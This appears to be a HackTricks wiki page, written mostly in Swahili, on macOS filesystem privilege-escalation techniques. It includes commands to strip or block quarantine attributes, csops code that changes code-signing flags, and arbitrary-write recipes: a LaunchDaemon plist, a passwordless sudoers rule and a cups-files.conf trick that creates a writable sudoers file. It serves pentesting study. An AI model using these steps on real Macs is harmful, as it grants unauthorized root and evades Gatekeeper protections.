# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Mchanganyiko wa ruhusa za POSIX

Kwa **directory**, bits tatu za ruhusa zina maana tofauti na zinavyomaanisha kwenye faili la kawaida. `chmod(1)` huita execute bit "**search**" inapotumika kwenye directory:<sup>[2]</sup>

> `0100` Kwa mafaili, inaruhusu owner kutekeleza. Kwa directories, inaruhusu owner **search** ndani ya directory.

- **read** - unaweza **kuorodhesha** entries za directory (kuorodhesha majina).
- **write** - unaweza **kuunda, kubadilisha jina na kufuta entries** kwenye directory. Kumbuka kuwa hii ni sifa ya directory *inayohifadhi* faili, si ya faili lenyewe: unaweza kufuta faili ambalo huwezi kulisoma au kuliandikia, mradi unaweza kuandikia parent directory yake.
- Ili kufuta **subdirectory**, lazima liwe tupu, jambo ambalo kwa upande wake linahitaji ruhusa za kutosha za kuondoa kila kitu kilicho ndani yake.
- Ikiwa directory ina **sticky bit** (`S_ISVTX`, kama `/tmp`) hii inazuiwa — POSIX inasema kwamba mchakato unaweza kuondoa au kubadilisha jina la mafaili ndani yake tu ikiwa unamiliki faili hilo, unamiliki directory, au una privileges zinazofaa.<sup>[1]</sup>
- **execute / search** - **unaruhusiwa kupita** kwenye directory. Utatuzi wa pathname hupata kila component "kwenye directory iliyotajwa na mtangulizi wake", hivyo **kupoteza search rights kwenye component yoyote moja ya path prefix hufanya kila kitu kilicho chini yake kisiweze kufikiwa kwa path**, hata kama leaf file lenyewe linaweza kusomeka na kila mtu.<sup>[1]</sup>

### Mchanganyiko Hatari

**Jinsi ya ku-overwrite faili/folder inayomilikiwa na root**, lakini:

- **Owner** wa parent **directory** moja kwenye path ni user
- **Owner** wa parent **directory** moja kwenye path ni **users group** yenye **write access**
- **Users group** ina **write** access kwenye **faili**

Kwa mchanganyiko wowote uliotajwa hapo awali, attacker angeweza **kuingiza** **sym/hard link** kwenye path iliyotarajiwa ili kupata arbitrary write yenye privileges.

### Hali maalum ya root R+X ya folder

Hii inatokana moja kwa moja na kanuni ya utatuzi wa pathname iliyo hapo juu. Ikiwa **directory inatoa R+X kwa root pekee**, mafaili yaliyo ndani yake hayawezi kufikiwa *kwa path* na mtu mwingine yeyote — lakini permission bits za mafaili **zenyewe** bado zinaweza kuwa permissive. Directory ndiyo kizuizi pekee.

Kwa hiyo primitive yoyote inayokuruhusu kutoa faili **nje ya directory hiyo** — mchakato wenye privileges unao **move/rename/copy** path iliyochaguliwa na attacker kwenda kwenye location ambayo unaweza kuipitia — hugeuka kuwa arbitrary read, bila kuhitaji kushinda mode ya faili lenyewe:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Tafuta privileged file movers (installers, log rotators, crash/diagnostic collectors, backup na vipengele vya "export") wanaokubali source path kutoka kwa mtumiaji mwenye privileges za chini.

## Symbolic Link / Hard Link

### Faili/folda yenye ruhusa pana

Ikiwa mchakato wenye privileges unaandika data kwenye **file** ambalo linaweza **kudhibitiwa** na **mtumiaji mwenye privileges za chini**, au ambalo linaweza kuwa **liliundwa awali** na mtumiaji mwenye privileges za chini. Mtumiaji huyo anaweza tu **kulielekeza kwenye file lingine** kupitia Symbolic au Hard link, na mchakato wenye privileges utaandika kwenye file hilo.

Angalia sehemu nyingine ambapo mshambuliaji anaweza **kutumia vibaya arbitrary write ili kufanya privilege escalation**.

### Open `O_NOFOLLOW`

Kulingana na [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Ni sehemu ya **mwisho** pekee inayokaguliwa — kila sehemu **ya kati** bado hutatuliwa na kufuatwa. Kwa hiyo, developer ambaye "amelinda" write kwa `O_NOFOLLOW` bado anaweza kushambuliwa kwa kupandikiza symlink kwenye **parent directory** yoyote ya target path.<sup>[3]</sup>

Man page hiyo hiyo inaeleza flags ambazo hufunga pengo hilo kwa kweli:<sup>[3]</sup>

- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*

Vinginevyo, `openat()` iliyo relative kwa directory FD ambayo tayari umeithibitisha, au `realpath()` + kufanya validation tena, ndizo njia zilizosalia za kuzuia mid-path symlink swaps.

## .fileloc

Files zenye extension ya **`.fileloc`** zinaweza kuelekeza kwenye applications au binaries nyingine, kwa hiyo zinapofunguliwa, application/binary hiyo ndiyo itakayo-execute.\
Mfano:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Ikiwa call ya `open` haina flag `O_CLOEXEC`, file descriptor itarithiwa na child process. Kwa hiyo, ikiwa privileged process itafungua privileged file na kutekeleza process inayodhibitiwa na attacker, attacker **atarithi FD ya privileged file**.

Mfano wa kawaida ni **`DYLD_PRINT_TO_FILE` LPE katika OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[4]</sup>

- `dyld` iliheshimu `DYLD_PRINT_TO_FILE=/path` hata katika **restricted (suid root) binaries**, kwa sababu variable hiyo iliparsewa nje ya `processDyldEnvironmentVariable()`.
- Ilifanya `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, hivyo **iliunda root-owned file katika arbitrary path**.
- FD **haikuwahi kufungwa na haikuwa na close-on-exec flag**, hivyo kila child wa suid binary alirithi **writable FD ya root-owned file**.
- Kuendesha, kwa mfano, `DYLD_PRINT_TO_FILE=/etc/target suid_binary` na kisha kusoma nambari ya inherited FD katika child kulitoa arbitrary root-owned writes; `fcntl(fd, F_SETFL, 0)` hata iliondoa `O_APPEND` ili kuruhusu overwriting badala ya appending.

Muundo huo huo hujitokeza kila privileged process inapofungua file **kabla** ya kufanya `exec` ya kitu unachodhibiti (helper tools, editors za mtindo wa `crontab` zinazoitwa kupitia `$EDITOR`, log/debug files zinazofunguliwa kutoka env-var path...). Enumerate FDs ulizorithi kwa kutumia:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Kitu chochote kilicho juu ya `2` kinachoelekeza kwenye faili ambalo huwezi kulifungua mwenyewe ni primitive ya arbitrary-write (au arbitrary-read).

## Epuka mbinu za quarantine xattrs

### Iondoe
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Ikiwa file/folder ina attribute hii ya immutable, haitawezekana kuweka xattr juu yake
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### File systems bila msaada wa xattr

Si kila file system ambayo macOS inaweza ku-mount huhifadhi **extended attributes** natively. HFS+ na APFS hufanya hivyo; **FAT32, exFAT na mounts nyingi za NFS hazifanyi** — macOS huziiga kwa kuandika side file ya **AppleDouble** yenye jina `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[5]</sup>

Hilo ni muhimu kwa quarantine, kwa sababu xattr hudumu tu ikiwa inaweza kuandikwa **na kusomwa tena** kutoka volume hiyo hiyo:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Ikiwa volume itasomwa baadaye kupitia path inayopuuza companion ya `._` (au companion hiyo ikaondolewa/kufutwa), file itafika **bila quarantine flag** — na `.app` isiyo na quarantine inatosha kukwepa App Sandbox, kama ilivyoelezwa katika [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

ACL hii huzuia kuongezwa kwa `xattrs` kwenye file
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Muundo wa faili wa **AppleDouble** hunakili faili pamoja na ACEs zake.

Katika [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) inawezekana kuona kwamba uwakilishi wa maandishi wa ACL unaohifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL katika faili iliyodecompressed. Kwa hivyo, ikiwa ulizip application ndani ya zip file kwa kutumia muundo wa faili wa **AppleDouble** wenye ACL inayozuia xattrs nyingine kuandikwa humo... quarantine xattr haikuwekwa kwenye application:

Angalia [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.<sup>[6]</sup>

Ili ku-replicate hili, kwanza tunahitaji kupata acl string sahihi:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Kumbuka kwamba hata ikiwa hii inafanya kazi, sandbox huandika quarantine xattr kabla)

Si muhimu sana lakini naiweka hapo kwa tahadhari tu:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass signature checks

### Bypass platform binaries checks

Baadhi ya ukaguzi wa usalama huangalia ikiwa binary ni **platform binary**, kwa mfano ili kuruhusu kuunganisha kwenye huduma ya XPC. Hata hivyo, kama ilivyoonyeshwa katika on bypass in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ inawezekana kupita ukaguzi huu kwa kupata platform binary (kama /bin/ls) na kuingiza exploit kupitia dyld kwa kutumia en env variable `DYLD_INSERT_LIBRARIES`.<sup>[7]</sup>

### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`

Inawezekana kwa binary inayotekelezwa kurekebisha flags zake yenyewe ili kupita ukaguzi kwa kutumia code kama hii:<sup>[7]</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Bundles ina file **`_CodeSignature/CodeResources`** ambayo ina **hash** ya kila **file** moja ndani ya **bundle**. Kumbuka kwamba hash ya CodeResources pia **ime-embed** ndani ya executable, kwa hivyo hatuwezi kuibadilisha, pia.

Hata hivyo, kuna baadhi ya files ambazo signature yake haitakaguliwa; hizi zina key `omit` katika plist, kama vile:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Inawezekana kukokotoa signature ya resource kutoka kwa cli kwa kutumia:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

Mtumiaji anaweza ku-mount dmg maalum iliyoundwa hata juu ya baadhi ya folda zilizopo. Hivi ndivyo unavyoweza kuunda package ya dmg maalum yenye content maalum:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Kwa kawaida macOS hu-mount disk kwa kuwasiliana na `com.apple.DiskArbitrarion.diskarbitrariond` Mach service (inayotolewa na `/usr/libexec/diskarbitrationd`). Ukiongeza param `-d` kwenye faili ya plist ya LaunchDaemons na kuanzisha upya, itaweka logs kwenye `/var/log/diskarbitrationd.log`.\
Hata hivyo, inawezekana kutumia tools kama `hdik` na `hdiutil` kuwasiliana moja kwa moja na `com.apple.driver.DiskImages` kext.

## Arbitrary Writes

### Periodic sh scripts

Ikiwa script yako inaweza kutafsiriwa kama **shell script**, unaweza ku-overwrite **`/etc/periodic/daily/999.local`** shell script ambayo itatriggeriwa kila siku.

Unaweza **kufake** execution ya script hii kwa: **`sudo periodic daily`**

### Daemons

Andika **LaunchDaemon** ya kiholela kama **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** yenye plist inayotekeleza script ya kiholela kama:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Tengeneza tu script `/Applications/Scripts/privesc.sh` yenye **commands** ambazo ungependa kuendesha kama root.

### Faili ya Sudoers

Ikiwa una **arbitrary write**, unaweza kuunda faili ndani ya folda **`/etc/sudoers.d/`** ili kujipa ruhusa za **sudo**.

### Faili za PATH

Faili **`/etc/paths`** ni mojawapo ya sehemu kuu zinazojaza variable ya mazingira ya PATH. Lazima uwe root ili kuibadilisha, lakini ikiwa script kutoka kwa **privileged process** inaendesha **command bila full path**, unaweza kuweza kuifanya **hijack** kwa kurekebisha faili hii.

Unaweza pia kuandika faili ndani ya **`/etc/paths.d`** ili kupakia folda mpya kwenye variable ya mazingira ya `PATH`.

### cups-files.conf

Mbinu hii ilitumika katika [writeup hii](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[8]</sup>

Unda faili `/etc/cups/cups-files.conf` yenye maudhui yafuatayo:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Hii itaunda faili `/etc/sudoers.d/lpe` lenye ruhusa 777. Maandishi ya ziada mwishoni yanalenga kuchochea uundaji wa error log.

Kisha, andika kwenye `/etc/sudoers.d/lpe` config inayohitajika ili ku-escalate privileges kama vile `%staff ALL=(ALL) NOPASSWD:ALL`.

Kisha, badilisha tena faili `/etc/cups/cups-files.conf` ukionyesha `LogFilePerm 700` ili faili jipya la sudoers liwe valid kwa ku-invoke `cupsctl`.

### Escape ya Sandbox

Inawezekana kutoroka macOS sandbox kwa kutumia FS arbitrary write. Kwa mifano kadhaa, angalia ukurasa wa [macOS Auto Start](../../../../macos-auto-start-locations.md), lakini njia ya kawaida ni kuandika preferences file ya Terminal katika `~/Library/Preferences/com.apple.Terminal.plist` ambayo hu-execute command wakati wa startup, kisha kuiita kwa kutumia `open`.

## Generate writable files as other users

Privesc primitive ya kawaida sana ni kufanya **privileged process ikutengenezee file** katika directory unayodhibiti, kisha kubaki na **write access** kwenye file hilo. Vipengele viwili vinahitajika:

1. Directory unayomiliki (au ambayo unaweza kuweka **inheritable ACL**), ili kila kitu kitakachoundwa ndani yake kirithi permissions zako.
2. Process ya privileged/`suid` inayoweza kuambiwa **wapi** iunde file — kwa kawaida kupitia debug/logging environment variable, config file, au XPC API ya helper.

Sehemu ya **inheritable ACL** ndiyo inayofanya file lililoundwa liwe writable kwako ingawa linamilikiwa na user mwingine. Flags za inheritance za `file_inherit` / `directory_inherit` zimeandikwa katika [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Sasa faili yoyote ambayo mchakato wenye privileges unatengeneza ndani ya `$DIRNAME` **inaweza kuandikwa na wewe**. Ikiwa directory hiyo pia ni eneo ambalo baadaye **linaendeshwa kama root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, directory ya LaunchDaemon...), hii ni root escalation ya moja kwa moja. Tazama sehemu za [Sudoers File](#sudoers-file) na [cups-files.conf](#cups-filesconf) hapo juu kwa maelezo ya cha kuandika pindi unapokuwa na faili hiyo.

Kwa mfano kamili unaoonyesha chain ya "`env variable` inasababisha mchakato wa root kutengeneza faili, na FD inavuja kwako", tazama [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) hapo juu.

## POSIX Shared Memory

**POSIX shared memory** huruhusu processes katika operating systems zinazotii POSIX kufikia eneo la memory linaloshirikiwa, hivyo kuwezesha mawasiliano ya haraka zaidi ikilinganishwa na mbinu nyingine za inter-process communication. Hii inahusisha kutengeneza au kufungua shared memory object kwa kutumia `shm_open()`, kuweka ukubwa wake kwa `ftruncate()`, na ku-mapping kwenye address space ya process kwa kutumia `mmap()`. Processes zinaweza kisha kusoma moja kwa moja kutoka na kuandika kwenye eneo hili la memory. Ili kudhibiti access ya wakati mmoja na kuzuia data corruption, synchronization mechanisms kama mutexes au semaphores hutumiwa mara nyingi. Mwishowe, processes hu-unmap na kufunga shared memory kwa `munmap()` na `close()`, na kwa hiari huondoa memory object kwa `shm_unlink()`. Mfumo huu ni bora hasa kwa IPC yenye ufanisi na kasi katika mazingira ambayo processes nyingi zinahitaji kufikia shared data kwa haraka.

<details>

<summary>Mfano wa Code ya Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Mfano wa Consumer Code</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSCguarded descriptors** ni kipengele cha usalama kilicholetwa katika macOS ili kuimarisha usalama na utegemezi wa **file descriptor operations** katika applications za watumiaji. Descriptors hizi zenye ulinzi hutoa njia ya kuhusisha vizuizi maalum au "guards" na file descriptors, ambavyo vinatekelezwa na kernel.

Kipengele hiki ni muhimu hasa katika kuzuia aina fulani za vulnerabilities za usalama, kama vile **ufikiaji usioidhinishwa wa mafaili** au **race conditions**. Vulnerabilities hizi hutokea, kwa mfano, thread inapofikia file description na kumpa **thread nyingine iliyo hatarini ufikiaji wake**, au file descriptor **inaporithiwa** na child process iliyo hatarini. Baadhi ya functions zinazohusiana na utendaji huu ni:

- `guarded_open_np`: Fungua FD yenye guard
- `guarded_close_np`: Ifunge
- `change_fdguard_np`: Badilisha guard flags kwenye descriptor (hata kuondoa ulinzi wa guard)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (File Access Permissions, Directory Protection, Pathname Resolution)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [`chmod(1)` man page](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [`open(2)` man page](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Which file systems and cloud services preserve extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Gatekeeper's Achilles heel: unearthing a macOS vulnerability](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: The diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
